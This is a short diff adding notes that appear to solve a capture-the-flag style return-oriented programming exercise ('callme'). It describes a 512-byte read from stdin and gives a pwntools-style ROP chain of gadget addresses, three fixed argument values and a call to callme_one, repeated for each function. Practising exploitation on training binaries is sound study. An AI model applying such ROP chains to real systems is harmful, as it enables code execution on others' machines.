@@ -1,0 +1,14 @@
+call to read() allows 512 bytes from stdin
+
+pass the 3 arguments in sequence after pop rdi; pop rsi; pop rdx; ret gadget
+and then call the function after ret gadget
+
+so the ropchain should look something like this:
+  p64(0x40093c) # pop rdi ; pop rsi ; pop rdx ; ret
++ p64(0xdeadbeefdeadbeef) # first argument
++ p64(0xcafebabecafebabe) # second argument
++ p64(0xd00df00dd00df00d) # third argument
++ p64(0x4006be) # ret
++ p64(0x400720) # callme_one
+
+do it three times for each function
